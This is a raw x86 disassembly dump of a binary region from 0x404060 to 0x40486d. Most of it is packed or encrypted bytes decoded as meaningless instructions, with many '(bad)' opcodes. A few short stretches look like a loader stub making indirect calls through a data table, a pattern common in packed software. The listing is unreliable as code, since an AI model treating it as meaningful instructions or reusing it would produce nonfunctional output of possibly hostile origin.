  404060:	or     DWORD PTR [eax+0x22553ddd],ecx
  404066:	rcl    BYTE PTR [ecx],1
  404068:	lahf   
  404069:	cmp    al,dl
  40406b:	jnp    0x4040af
  40406d:	arpl   WORD PTR [esi],si
  40406f:	pushf  
  404070:	dec    ecx
  404071:	sbb    eax,0xc264eed6
  404076:	jbe    0x4040a9
  404078:	or     al,0x9a
  40407a:	xchg   BYTE PTR [eax-0x1486e17e],ch
  404080:	cli    
  404081:	mov    ebx,0x64a40126
  404086:	lds    ecx,FWORD PTR [ecx]
  404088:	popf   
  404089:	xlat   BYTE PTR ds:[ebx]
  40408a:	icebp  
  40408b:	lea    esp,[ebp-0x4d]
  40408e:	stos   BYTE PTR es:[edi],al
  40408f:	ret    
  404090:	out    dx,al
  404091:	ds fwait
  404093:	push   cs
  404094:	in     eax,0x71
  404096:	inc    edi
  404097:	inc    esi
  404098:	xor    al,0xfc
  40409a:	mov    dh,0xd1
  40409c:	sbb    cl,BYTE PTR [edi]
  40409e:	jno    0x404023
  4040a0:	push   esp
  4040a1:	push   edi
  4040a2:	inc    edx
  4040a3:	data16 neg BYTE PTR [ebp-0x5a09279e]
  4040aa:	and    ebx,edi
  4040ac:	lea    ebp,[esi+eax*8-0x3f]
  4040b0:	jmp    0xd054dc53
  4040b5:	loope  0x404068
  4040b7:	mov    eax,ds:0x6d168d6d
  4040bc:	popa   
  4040bd:	mov    esi,0x2d39e32b
  4040c2:	imul   ecx,DWORD PTR [edi-0x7b9d6647],0xffffffce
  4040c9:	jl     0x4040b2
  4040cb:	repnz dec ecx
  4040cd:	out    dx,al
  4040ce:	adc    dl,BYTE PTR [edi-0x132dfeb8]
  4040d4:	push   cs
  4040d5:	or     eax,0x9caad06b
  4040da:	lds    edx,FWORD PTR [ecx]
  4040dc:	jnp    0x404069
  4040de:	in     al,0x20
  4040e0:	and    BYTE PTR [ecx+0x2d],al
  4040e3:	ret    0xa34b
  4040e6:	popf   
  4040e7:	call   0x6ec56d3e
  4040ec:	adc    eax,0x64822eab
  4040f1:	in     eax,dx
  4040f2:	push   ss
  4040f3:	fbstp  TBYTE PTR [ecx+ebx*8]
  4040f6:	inc    esi
  4040f7:	repz sub eax,0xafc318a2
  4040fd:	push   0x1e
  4040ff:	retf   
  404100:	mov    al,0x7d
  404102:	mov    eax,0x67069471
  404107:	mov    ds:0x5823a32,eax
  40410c:	call   0x293:0x31f55621
  404113:	mov    ds:0xa8738a44,eax
  404118:	js     0x4040b5
  40411a:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40411c:	adc    al,0x58
  40411e:	mov    ah,0x38
  404120:	js     0x404105
  404122:	xor    eax,0x5f756c70
  404127:	cmp    eax,0x89f6afa8
  40412c:	popf   
  40412d:	jecxz  0x4040f0
  40412f:	and    al,0xb7
  404131:	inc    BYTE PTR [ebp+0x3b]
  404134:	mov    bl,0xba
  404136:	aam    0x35
  404138:	test   eax,0x9a0e86ef
  40413d:	mov    esi,0xa027572
  404142:	push   edi
  404143:	std    
  404144:	pop    ebx
  404145:	or     cl,BYTE PTR [edx-0x50]
  404148:	iret   
  404149:	adc    ecx,edx
  40414b:	out    0x8f,al
  40414d:	test   al,0xb6
  40414f:	enter  0x5667,0xa3
  404153:	mov    al,ds:0x954590cc
  404158:	div    BYTE PTR [esi-0x4]
  40415b:	aas    
  40415c:	fst    st(1)
  40415e:	(bad)
  404162:	jp     0x404150
  404164:	stos   BYTE PTR es:[edi],al
  404165:	cmp    dl,bh
  404167:	lds    edi,FWORD PTR [edx]
  404169:	add    al,0x32
  40416b:	or     edi,DWORD PTR [esi]
  40416d:	or     eax,0x668a3826
  404172:	test   DWORD PTR [ebx+0x2c862be5],ebx
  404178:	ss jo  0x404123
  40417b:	xlat   BYTE PTR ds:[ebx]
  40417c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40417d:	stc    
  40417e:	cmp    dl,BYTE PTR [ecx-0x55cdf030]
  404184:	aad    0xb0
  404186:	shr    BYTE PTR [esi],0xb
  404189:	xchg   esp,eax
  40418a:	jp     0x40417b
  40418c:	cdq    
  40418d:	pushf  
  40418e:	ror    DWORD PTR [ecx-0x46f6eba2],0xc4
  404195:	pop    edi
  404196:	daa    
  404197:	and    BYTE PTR [ecx],0x6f
  40419a:	jns    0x4041d0
  40419c:	and    bl,BYTE PTR [esi+ecx*4]
  40419f:	sub    edx,DWORD PTR [ebp+0x26b07e7f]
  4041a5:	sahf   
  4041a6:	ret    0xcb75
  4041a9:	aad    0xae
  4041ab:	pop    ss
  4041ac:	jae    0x404148
  4041ae:	and    esp,DWORD PTR [eax]
  4041b0:	into   
  4041b1:	out    0xed,al
  4041b3:	mov    ah,0x8
  4041b5:	mov    bl,0xca
  4041b7:	mov    ebp,0x3ef2e96d
  4041bc:	sub    al,0x88
  4041be:	loopne 0x404223
  4041c0:	leave  
  4041c1:	jg     0x40417b
  4041c3:	vpmaxsw ymm0,ymm7,YMMWORD PTR [eax+0x14]
  4041c8:	mov    al,ds:0x17aa7c1d
  4041cd:	loop   0x40417c
  4041cf:	clc    
  4041d0:	fstp   QWORD PTR [ecx]
  4041d2:	add    al,0x88
  4041d4:	out    dx,al
  4041d5:	rol    DWORD PTR [ecx],1
  4041d7:	adc    edi,DWORD PTR [edi+0x219230da]
  4041dd:	and    DWORD PTR [ebp-0x7f6091d7],ebx
  4041e3:	sub    bl,0x19
  4041e6:	sbb    eax,0xad99d0aa
  4041eb:	ds ins DWORD PTR es:[edi],dx
  4041ed:	clc    
  4041ee:	in     eax,dx
  4041ef:	sub    al,0x7
  4041f1:	fistp  DWORD PTR [ebx-0x7a]
  4041f4:	mov    ebx,0xe220c878
  4041f9:	loope  0x404237
  4041fb:	sti    
  4041fc:	enter  0x8de,0x92
  404200:	cmp    al,0x67
  404202:	jg     0x4041c3
  404204:	jl     0x40423e
  404206:	or     al,0xf
  404208:	js     0x4041f7
  40420a:	mov    bh,0x52
  40420c:	in     eax,dx
  40420d:	mov    es,WORD PTR [eax+0xafed187]
  404213:	push   DWORD PTR [ebp-0x18]
  404216:	mov    eax,ds:0x413c9a
  40421b:	mov    eax,DWORD PTR [eax]
  40421d:	push   DWORD PTR [eax]
  40421f:	lea    eax,ds:0x413cb6
  404225:	push   DWORD PTR [eax]
  404227:	lea    eax,ds:0x413a62
  40422d:	push   DWORD PTR [eax]
  40422f:	lea    eax,ds:0x413c96
  404235:	jmp    0x404643
  40423a:	out    0xed,eax
  40423c:	sahf   
  40423d:	(bad)  
  40423e:	mov    ah,0x55
  404240:	addr16 in eax,dx
  404242:	push   edi
  404243:	sub    DWORD PTR [bx+si+0x50],0xffffffa8
  404248:	mov    ch,0x49
  40424a:	aad    0x25
  40424c:	jle    0x4042cc
  40424e:	outs   dx,DWORD PTR ds:[esi]
  40424f:	jge    0x4042cf
  404251:	jle    0x4042ce
  404253:	neg    edx
  404255:	lahf   
  404256:	test   ecx,edx
  404258:	into   
  404259:	inc    edi
  40425a:	(bad)  
  40425b:	gs adc al,0xdc
  40425e:	loop   0x404212
  404260:	sti    
  404261:	mov    edi,0xf75a0570
  404266:	fwait
  404267:	or     ebp,DWORD PTR [edx]
  404269:	fsub   QWORD PTR [eax+ebp*1+0x4f]
  40426d:	mov    esp,0x9d637ed2
  404272:	jbe    0x404246
  404274:	jb     0x404236
  404276:	push   0xe878c485
  40427b:	out    0xc3,al
  40427d:	sbb    bh,ah
  40427f:	and    DWORD PTR [edx-0x65b9b1ca],ebx
  404285:	mov    ch,0x23
  404287:	ror    eax,0x9c
  40428a:	aam    0xf8
  40428c:	pop    ss
  40428d:	gs sub al,0xc4
  404290:	mov    esp,0xc21560fb
  404295:	es xor eax,0x26ace266
  40429b:	lock dec edi
  40429d:	scas   eax,DWORD PTR es:[edi]
  40429e:	xor    BYTE PTR gs:[eax+0x12],ah
  4042a2:	pushf  
  4042a3:	dec    ebx
  4042a4:	xchg   esi,eax
  4042a5:	push   ss
  4042a6:	icebp  
  4042a7:	repz mov eax,0xb6dce2bd
  4042ad:	push   edx
  4042ae:	loopne 0x40431b
  4042b0:	aaa    
  4042b1:	arpl   cx,ax
  4042b3:	mov    ds:0xab76d508,al
  4042b8:	outs   dx,BYTE PTR ds:[esi]
  4042b9:	shr    DWORD PTR [esi+eax*2],cl
  4042bc:	iret   
  4042bd:	dec    esp
  4042be:	test   BYTE PTR [edi+edx*1+0x52fd68ac],al
  4042c5:	retf   0x504
  4042c8:	stc    
  4042c9:	pop    ds
  4042ca:	ins    DWORD PTR es:[edi],dx
  4042cb:	or     BYTE PTR [ebp-0x72],al
  4042ce:	scas   al,BYTE PTR es:[edi]
  4042cf:	lahf   
  4042d0:	outs   dx,BYTE PTR ds:[esi]
  4042d1:	mov    eax,ds:0xed9a6e56
  4042d6:	adc    al,0xfb
  4042d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042d9:	push   ecx
  4042da:	test   DWORD PTR [esi],esi
  4042dc:	jno    0x4042f3
  4042de:	(bad)  
  4042df:	in     al,dx
  4042e0:	or     DWORD PTR [edx+0x7b1fbca],0x66c490b3
  4042ea:	cmp    BYTE PTR [ebp-0x3a],0x28
  4042ee:	jae    0x40433b
  4042f0:	adc    DWORD PTR [edi+0x51fe203d],ecx
  4042f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042f7:	imul   eax,DWORD PTR [ecx],0x69
  4042fa:	push   es
  4042fb:	cli    
  4042fc:	or     al,0x3c
  4042fe:	and    bh,BYTE PTR [edx-0xc]
  404301:	cwde   
  404302:	cdq    
  404303:	test   al,0x7a
  404305:	jp     0x404337
  404307:	mov    ecx,0xab710f87
  40430c:	sub    al,0x56
  40430e:	cdq    
  40430f:	jae    0x4042c1
  404311:	popa   
  404312:	(bad)  
  404313:	out    dx,al
  404314:	xlat   BYTE PTR ds:[bx]
  404316:	loop   0x4042ec
  404318:	dec    edi
  404319:	adc    edx,DWORD PTR [esi+0x34ddfd77]
  40431f:	(bad)  
  404320:	push   eax
  404321:	and    eax,0xf61a7649
  404326:	jns    0x4042c0
  404328:	ins    BYTE PTR es:[edi],dx
  404329:	aas    
  40432a:	xor    eax,0x89acdca1
  40432f:	iret   
  404330:	iret   
  404331:	cmp    al,0x80
  404333:	je     0x4042f2
  404335:	jmp    0x4042df
  404337:	mov    ds:0x1596ed09,eax
  40433c:	loopne 0x404318
  40433e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40433f:	in     eax,dx
  404340:	imul   esi,DWORD PTR [eax],0xfffffffc
  404343:	bswap  ecx
  404345:	cmp    dl,BYTE PTR [ebx+0x1c]
  404348:	nop
  404349:	lods   al,BYTE PTR ds:[esi]
  40434b:	lea    edx,ds:0x4700a9c9
  404351:	jmp    0x5d89:0x9a0c37b6
  404358:	cwde   
  404359:	jl     0x4042e6
  40435b:	call   0x1535:0xb5a07ffb
  404362:	add    eax,0x3335d1b3
  404367:	gs mov ch,0xd5
  40436a:	dec    esi
  40436b:	cmp    al,0xa
  40436d:	xor    esp,eax
  40436f:	sbb    BYTE PTR [eax],dh
  404371:	(bad)  
  404372:	pop    ss
  404373:	imul   esi,DWORD PTR [edi-0x38],0x56
  404377:	ret    0x847b
  40437a:	repz je 0x404380
  40437d:	stc    
  40437e:	mov    bh,0x6
  404380:	and    edx,edx
  404382:	pop    ebp
  404383:	inc    eax
  404384:	je     0x40433f
  404386:	xchg   edi,eax
  404387:	jmp    0x404384
  404389:	ret    0xd27a
  40438c:	ret    0x9030
  40438f:	mov    eax,ds:0xdeb88a04
  404394:	test   eax,0x30bf1537
  404399:	mov    ebx,0xde2543da
  40439e:	sub    eax,0xf4c7eb1e
  4043a3:	test   al,0x22
  4043a5:	ss out dx,eax
  4043a7:	movups XMMWORD PTR [eax+0x24],xmm4
  4043ab:	out    0x89,al
  4043ad:	pop    ss
  4043ae:	push   ds
  4043af:	mov    bh,0x20
  4043b1:	mov    ebx,0xccb2c011
  4043b6:	test   eax,0x5fa50911
  4043bb:	test   eax,0x799e7aa2
  4043c0:	aam    0x3
  4043c2:	sub    eax,0x4bbf61bd
  4043c7:	adc    esi,DWORD PTR [ebx]
  4043c9:	and    DWORD PTR [ebx],0x19fb4733
  4043cf:	in     eax,dx
  4043d0:	rcl    BYTE PTR [ebx+0x3e01cabd],cl
  4043d6:	inc    ebx
  4043d7:	pop    edx
  4043d8:	sub    DWORD PTR [edx+ebx*4-0x4],edi
  4043dc:	(bad)  
  4043dd:	mov    al,0x14
  4043df:	idiv   DWORD PTR [esi+0x7c862ad7]
  4043e5:	stc    
  4043e6:	add    eax,DWORD PTR [edi]
  4043e8:	pop    ecx
  4043e9:	int3   
  4043ea:	loope  0x404379
  4043ec:	cwde   
  4043ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043ee:	pop    esi
  4043ef:	or     eax,0x9ce6a86f
  4043f4:	and    eax,0xa83b8d83
  4043f9:	(bad)  [eax-0x7b]
  4043fc:	push   ss
  4043fd:	mov    fs,WORD PTR [ebx-0x595d8d6b]
  404403:	pop    ebx
  404404:	cs cs sub edi,edi
  404408:	adc    ebx,esi
  40440a:	addr16 dec ebx
  40440c:	cmp    ebx,eax
  40440e:	cmp    BYTE PTR [eax],ch
  404410:	(bad)  
  404411:	mov    edi,0x7f676498
  404416:	push   edi
  404417:	bound  ebx,QWORD PTR [edx]
  404419:	nop
  40441a:	mov    DWORD PTR ds:0x566f73e7,edx
  404420:	push   esi
  404421:	jne    0x40442e
  404423:	pusha  
  404424:	push   ds
  404425:	dec    ebp
  404426:	sub    al,0xe9
  404428:	xchg   edx,eax
  404429:	push   es
  40442a:	xchg   DWORD PTR ss:[ebx+0x67ad14c1],ecx
  404431:	xchg   edx,eax
  404432:	icebp  
  404433:	cmp    al,0x35
  404435:	mov    al,0x4
  404437:	test   al,ch
  404439:	scas   eax,DWORD PTR es:[edi]
  40443a:	imul   ebx,ecx,0x4e838342
  404440:	dec    ecx
  404441:	jecxz  0x404493
  404443:	pop    ds
  404444:	push   edx
  404445:	mov    edi,0xb37aaaae
  40444a:	das    
  40444b:	inc    edx
  40444c:	nop
  40444d:	jecxz  0x4043f1
  40444f:	pop    edx
  404450:	jge    0x40447b
  404452:	adc    eax,0x40cc7f33
  404457:	das    
  404458:	and    eax,0xb20e9472
  40445d:	mov    cl,0xca
  40445f:	jle    0x4044b4
  404461:	jbe    0x40442b
  404463:	daa    
  404464:	ror    dh,cl
  404466:	mov    ch,0xb5
  404468:	outs   dx,BYTE PTR ds:[esi]
  404469:	inc    ebp
  40446a:	add    eax,0x587ecf81
  40446f:	cmc    
  404470:	iret   
  404471:	ror    DWORD PTR [ebx+0x36738170],1
  404477:	push   ds
  404478:	sbb    DWORD PTR ds:0x8cf548fd,0x39
  40447f:	add    bl,BYTE PTR [ebp-0x55]
  404482:	leave  
  404483:	pusha  
  404484:	push   edi
  404485:	lea    edx,[edi+0x2d870cd0]
  40448b:	or     edi,DWORD PTR [esi]
  40448d:	mul    BYTE PTR [edx-0x51aa5ba5]
  404493:	add    edi,DWORD PTR [ebp+0x54ddbb45]
  404499:	fisttp DWORD PTR [edi+0x3d]
  40449c:	dec    ecx
  40449d:	push   edi
  40449e:	js     0x4044fb
  4044a0:	push   ebx
  4044a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044a2:	rcr    BYTE PTR [edi],0xce
  4044a5:	(bad)  
  4044a6:	in     eax,0x50
  4044a8:	fnsave [ebx+0x9]
  4044ab:	test   BYTE PTR [eax],dl
  4044ad:	sbb    eax,0xc6e81fbc
  4044b2:	add    DWORD PTR [ecx+0x57],ebp
  4044b5:	hlt    
  4044b6:	jge    0x404446
  4044b8:	into   
  4044b9:	ins    BYTE PTR es:[edi],dx
  4044ba:	jno    0x4044da
  4044bc:	dec    edx
  4044bd:	or     eax,0x5fa7ccf0
  4044c2:	jnp    0x4044cf
  4044c4:	out    0xc1,al
  4044c6:	sbb    ebx,DWORD PTR [eax-0x169a6ba3]
  4044cc:	aad    0x92
  4044ce:	out    dx,eax
  4044cf:	sahf   
  4044d0:	sub    ebx,ebx
  4044d2:	enter  0x3c1b,0xe8
  4044d6:	imul   esp,DWORD PTR ds:0x6766ab1b,0x712c6d4
  4044e0:	(bad)
  4044e3:	mov    ch,0x9c
  4044e5:	lea    edi,[ebp-0x53e2b8c6]
  4044eb:	ror    DWORD PTR [ebx+0x6926cf2d],cl
  4044f1:	test   DWORD PTR ds:0x9d70c9a0,edx
  4044f7:	xchg   edi,eax
  4044f8:	jne    0x40455d
  4044fa:	xor    dl,BYTE PTR [ebx-0x11]
  4044fd:	sbb    BYTE PTR ds:0x1e16b402,0x96
  404504:	popf   
  404505:	xchg   ebp,eax
  404506:	faddp  st(5),st
  404508:	ja     0x404552
  40450a:	mov    bh,0xda
  40450c:	push   cs
  40450d:	cdq    
  40450e:	jle    0x404580
  404510:	test   BYTE PTR [ecx+0x4c],bl
  404513:	fs gs jae 0x404538
  404517:	out    0xb8,al
  404519:	inc    esi
  40451a:	inc    esi
  40451b:	inc    esp
  40451c:	xor    DWORD PTR [ecx],ebx
  40451e:	shl    BYTE PTR [eax+0x78492170],0xee
  404525:	out    0x8c,al
  404527:	push   ss
  404528:	xchg   edx,eax
  404529:	xor    edx,ebx
  40452b:	imul   edx,ebx,0xe4c2a47c
  404531:	retfw  
  404533:	addr16 enter 0x33c0,0x8e
  404538:	sar    DWORD PTR [esi-0x4],cl
  40453b:	cmp    dh,0xc
  40453e:	sub    BYTE PTR [edx+0x55],cl
  404541:	lods   al,BYTE PTR ds:[esi]
  404542:	xchg   ebx,eax
  404543:	push   edi
  404544:	(bad)  
  404545:	(bad)  
  404546:	mov    edx,0x6c2721e2
  40454b:	pop    ds
  40454c:	stos   BYTE PTR es:[edi],al
  40454d:	fisub  DWORD PTR [edx+0x21]
  404550:	cmp    ebp,DWORD PTR [edi-0x5f]
  404553:	add    eax,0x471d23d8
  404558:	jmp    0xe9e:0x31e752fc
  40455f:	fmul   QWORD PTR [ebp-0x7ed1eae0]
  404565:	iret   
  404566:	jno    0x404545
  404568:	adc    eax,0x26e576d2
  40456d:	in     al,dx
  40456e:	out    0xdb,eax
  404570:	pop    eax
  404571:	inc    edi
  404572:	ds int3 
  404574:	fidivr WORD PTR [ebx+eiz*8]
  404577:	inc    DWORD PTR [ebx-0x40]
  40457a:	repz add ebx,DWORD PTR [esi]
  40457d:	jne    0x404533
  40457f:	outs   dx,DWORD PTR ds:[esi]
  404580:	loopne 0x40455e
  404582:	xchg   esp,eax
  404583:	xor    eax,0x8451a4a3
  404588:	call   0xab3b:0xcc84a76
  40458f:	cs scas al,BYTE PTR es:[edi]
  404591:	pop    eax
  404592:	stos   BYTE PTR es:[edi],al
  404593:	jg     0x4045a3
  404595:	lea    eax,[ecx]
  404597:	or     al,0xbc
  404599:	daa    
  40459a:	pop    ds
  40459b:	loop   0x4045e0
  40459d:	imul   esp,DWORD PTR [ebp+0x48],0xc13fe1f6
  4045a4:	inc    ecx
  4045a5:	dec    eax
  4045a6:	cs inc esp
  4045a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045a9:	pop    esi
  4045aa:	cmp    esi,ebp
  4045ac:	push   ebp
  4045ad:	jo     0x4045df
  4045af:	mov    al,0xe8
  4045b1:	xchg   ch,ch
  4045b3:	and    al,BYTE PTR [ebx-0x13f75ee8]
  4045b9:	fsub   DWORD PTR [ebp+0x5e]
  4045bc:	cwde   
  4045bd:	enter  0xc1c8,0x2
  4045c1:	dec    ebx
  4045c2:	pop    ss
  4045c3:	cs xchg edx,eax
  4045c5:	push   0x12b7cb2c
  4045ca:	loope  0x404589
  4045cc:	pop    ds
  4045cd:	outs   dx,DWORD PTR ds:[esi]
  4045ce:	add    BYTE PTR [esi],0x15
  4045d1:	cwde   
  4045d2:	retf   
  4045d3:	cmp    al,0xd8
  4045d5:	inc    esi
  4045d6:	scas   al,BYTE PTR es:[edi]
  4045d7:	stos   DWORD PTR es:[edi],eax
  4045d8:	stos   BYTE PTR es:[edi],al
  4045d9:	(bad)  
  4045da:	or     al,0x98
  4045dc:	jo     0x404608
  4045de:	sub    ebx,DWORD PTR [ebp+0x79b7146b]
  4045e4:	pusha  
  4045e5:	inc    eax
  4045e6:	inc    esp
  4045e7:	xchg   BYTE PTR [eax],cl
  4045e9:	loop   0x404631
  4045eb:	sbb    DWORD PTR [ebx],ecx
  4045ed:	je     0x40461c
  4045ef:	push   ss
  4045f0:	es push ds
  4045f2:	js     0x4045eb
  4045f4:	in     eax,dx
  4045f5:	push   ss
  4045f6:	mov    DWORD PTR [ebp+edi*2-0xb800f7d],edx
  4045fd:	bound  ecx,QWORD PTR [ebp+0x2e]
  404600:	adc    al,0xca
  404602:	(bad)  
  404604:	mov    eax,0xef229581
  404609:	push   cs
  40460a:	(bad)  
  40460b:	(bad)  
  40460d:	mov    ecx,0x7e472631
  404612:	pop    eax
  404613:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404614:	mov    ch,0xcc
  404616:	pop    esi
  404617:	mov    eax,0x6a523e5f
  40461c:	xor    eax,0x49ae3f70
  404621:	out    0xf7,eax
  404623:	push   esi
  404624:	mov    ds:0xd1412558,eax
  404629:	mov    ebx,0x76702909
  40462e:	aad    0x7a
  404630:	or     ecx,0x25
  404633:	ja     0x404622
  404635:	sbb    edx,0x3b06a2dd
  40463b:	push   edx
  40463c:	loope  0x40461a
  40463e:	inc    eax
  40463f:	xchg   edx,eax
  404640:	gs sub eax,0x8d30ff4d
  404646:	add    eax,0x413dc2
  40464b:	push   DWORD PTR [eax]
  40464d:	xchg   ebx,edx
  40464f:	inc    ebx
  404650:	inc    ebx
  404651:	push   ebx
  404652:	pop    eax
  404653:	call   DWORD PTR [eax-0x2]
  404656:	mov    eax,DWORD PTR [ebp-0x38]
  404659:	mov    ecx,DWORD PTR ds:0x413c5a
  40465f:	add    DWORD PTR [eax],ecx
  404661:	jmp    0x404a6f
  404666:	xor    DWORD PTR ds:0xb112a30a,ebx
  40466c:	mov    cl,0xad
  40466e:	jne    0x404697
  404670:	xor    eax,0xb40807e3
  404675:	repz ret 0x7e21
  404679:	jle    0x4046ea
  40467b:	jge    0x4046fb
  40467d:	jle    0x4046e4
  40467f:	call   0x8130:0xf854692c
  404686:	push   edi
  404687:	(bad)  
  404688:	aam    0x4c
  40468a:	les    ecx,FWORD PTR ds:0xf72816de
  404690:	and    eax,0xa9870734
  404695:	faddp  st(6),st
  404697:	push   edx
  404698:	daa    
  404699:	cmp    al,0x12
  40469b:	jbe    0x40466e
  40469d:	gs jbe 0x404643
  4046a0:	fimul  DWORD PTR [edi-0x3ff60ef3]
  4046a6:	neg    DWORD PTR ds:0xc75d9287
  4046ac:	js     0x4046a0
  4046ae:	shr    edi,1
  4046b0:	in     al,dx
  4046b1:	cmp    al,0xb2
  4046b3:	sbb    DWORD PTR [esi],edx
  4046b5:	mov    edx,ss
  4046b7:	mov    ebx,ecx
  4046b9:	es pop esp
  4046bb:	fcomp  QWORD PTR [edx+0x274641f9]
  4046c1:	dec    eax
  4046c2:	mov    al,ds:0x6bd18505
  4046c7:	xor    dh,ch
  4046c9:	test   al,0xfe
  4046cb:	loope  0x404655
  4046cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046ce:	xor    eax,0xdfb7be05
  4046d3:	test   al,0x2d
  4046d5:	sub    esi,0x20376635
  4046db:	xor    ebx,DWORD PTR ds:0xa3e2849a
  4046e1:	(bad)  
  4046e2:	rcl    ebp,1
  4046e4:	jge    0x404689
  4046e6:	loop   0x40467a
  4046e8:	xor    eax,DWORD PTR [esp+ecx*1+0x1dcd0f6c]
  4046ef:	pop    ebp
  4046f0:	fiadd  DWORD PTR [ebx-0x5fbedf75]
  4046f6:	push   ebp
  4046f7:	in     al,0x8c
  4046f9:	and    eax,0xb478f4f1
  4046fe:	leave  
  4046ff:	pop    ss
  404700:	je     0x4046d1
  404702:	dec    esp
  404703:	rol    edx,1
  404705:	daa    
  404706:	loope  0x4046cd
  404708:	bound  ebx,QWORD PTR [edi+0x7008c045]
  40470e:	xchg   BYTE PTR [esi+0x10bc7e8d],dl
  404714:	std    
  404715:	jb     0x40469f
  404717:	lock dec edx
  404719:	pop    ecx
  40471a:	sbb    DWORD PTR [edx-0x48],0xffffff85
  40471e:	in     al,0x14
  404720:	pop    edx
  404721:	pop    edx
  404722:	data16 adc BYTE PTR [edi+0x7d],bh
  404726:	loop   0x404788
  404728:	sbb    cl,BYTE PTR [edx-0x4bb5db3e]
  40472e:	sahf   
  40472f:	jno    0x404781
  404731:	pop    esp
  404732:	int    0xe4
  404734:	int3   
  404735:	xor    dl,BYTE PTR [ebp+edx*4+0x76]
  404739:	test   BYTE PTR [edx],0x1b
  40473c:	fbstp  TBYTE PTR [edx-0x3b]
  40473f:	add    al,dh
  404741:	sbb    DWORD PTR [esi],edi
  404743:	xchg   esp,eax
  404744:	fdivr  st(7),st
  404746:	ins    BYTE PTR es:[edi],dx
  404747:	es cmp eax,0xfcd76604
  40474d:	jo     0x404715
  40474f:	cwde   
  404750:	jp     0x4047b4
  404752:	popf   
  404753:	aam    0xec
  404755:	adc    ecx,DWORD PTR ds:0x55139a12
  40475b:	aas    
  40475c:	pop    esi
  40475d:	les    esp,FWORD PTR [esi-0x43d44d29]
  404763:	mov    ebx,DWORD PTR [ebp+0x56]
  404766:	fcmovu st,st(6)
  404768:	cmp    ecx,edi
  40476a:	push   ebx
  40476b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40476c:	mov    eax,DWORD PTR [eax]
  40476e:	dec    edx
  40476f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404770:	mov    bh,0xf0
  404773:	and    BYTE PTR [di-0x5a],al
  404777:	in     al,0x48
  404779:	cdq    
  40477a:	loopne 0x4047d4
  40477c:	xor    eax,0x571eb8f7
  404781:	loop   0x4047f4
  404783:	mov    BYTE PTR [esp+eiz*8],bl
  404786:	(bad)  
  404787:	push   es
  404788:	lahf   
  404789:	or     ecx,DWORD PTR [edi-0x6d360bc1]
  40478f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404790:	shr    DWORD PTR [ebx+0x3a849271],cl
  404796:	aas    
  404797:	loopne 0x40480a
  404799:	mov    WORD PTR [edi],?
  40479b:	fist   WORD PTR [ebx]
  40479d:	mov    ss,esi
  40479f:	jle    0x40475d
  4047a1:	loope  0x404783
  4047a3:	push   ds
  4047a4:	jge    0x4047e8
  4047a6:	adc    al,0x9e
  4047a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047a9:	into   
  4047aa:	retf   
  4047ab:	std    
  4047ac:	jbe    0x4047d7
  4047ae:	jmp    0xa7c9:0xd30ac799
  4047b5:	cld    
  4047b6:	or     eax,0xb7bff797
  4047bb:	jae    0x404747
  4047bd:	cs (bad) 
  4047bf:	adc    edi,edx
  4047c1:	in     al,dx
  4047c2:	push   ebp
  4047c3:	or     ecx,ebp
  4047c5:	jge    0x404818
  4047c7:	or     esi,DWORD PTR [eax]
  4047c9:	mov    esp,0xeb7de821
  4047ce:	push   0x30
  4047d0:	fcom   DWORD PTR ds:0xba10c9b0
  4047d6:	psrld  mm7,mm6
  4047d9:	ins    DWORD PTR es:[edi],dx
  4047da:	fstp   TBYTE PTR [edx+eiz*2+0x6c]
  4047de:	jmp    0xec23:0x526b98d4
  4047e5:	jle    0x40477b
  4047e7:	inc    edx
  4047e8:	mov    ecx,0x9d9f6e03
  4047ed:	add    edi,esp
  4047ef:	aam    0x47
  4047f1:	xchg   ecx,eax
  4047f2:	js     0x404798
  4047f4:	mov    eax,0x9decc214
  4047f9:	mov    ebp,0x513ed3d1
  4047fe:	scas   al,BYTE PTR es:[edi]
  4047ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404800:	test   ebp,0x445abf0d
  404806:	add    eax,0x13ae821a
  40480b:	cmp    ebp,DWORD PTR [ebp-0x2dfcb2a3]
  404811:	aas    
  404812:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  404814:	outs   dx,BYTE PTR ds:[esi]
  404815:	js     0x404874
  404817:	jno    0x4047a3
  404819:	fadd   DWORD PTR [eax-0x80]
  40481c:	sub    al,0xb8
  40481e:	stos   DWORD PTR es:[edi],eax
  40481f:	adc    dh,BYTE PTR [eax]
  404821:	mov    al,ds:0x1b1052d0
  404826:	xchg   ah,cl
  404828:	adc    al,0xe9
  40482a:	out    0xcb,al
  40482c:	mov    ebx,0xdc940c06
  404831:	and    esi,DWORD PTR [ebp+0x2]
  404834:	fistp  QWORD PTR [edx]
  404836:	jns    0x404835
  404838:	add    DWORD PTR [ecx+edx*4],ebp
  40483b:	out    dx,al
  40483c:	xchg   esi,eax
  40483d:	in     al,dx
  40483e:	jne    0x404843
  404840:	add    BYTE PTR [eax-0x2e],ah
  404843:	mov    BYTE PTR [ecx-0x7c],ah
  404846:	pushf  
  404847:	sti    
  404848:	pop    edx
  404849:	mov    eax,ds:0x36862e2b
  40484e:	inc    ebx
  40484f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404850:	dec    esi
  404851:	ss cwde 
  404853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404854:	arpl   WORD PTR [edi],cx
  404856:	inc    esi
  404857:	popf   
  404858:	inc    eax
  404859:	shl    DWORD PTR [ecx],1
  40485b:	add    eax,0xde960f57
  404860:	xor    al,0xdb
  404862:	and    DWORD PTR [esi],ecx
  404864:	mov    al,0x90
  404866:	test   DWORD PTR [ebx+0x4713c97a],ebx
  40486c:	xchg   edi,eax
  40486d:	mov    ch,0x33
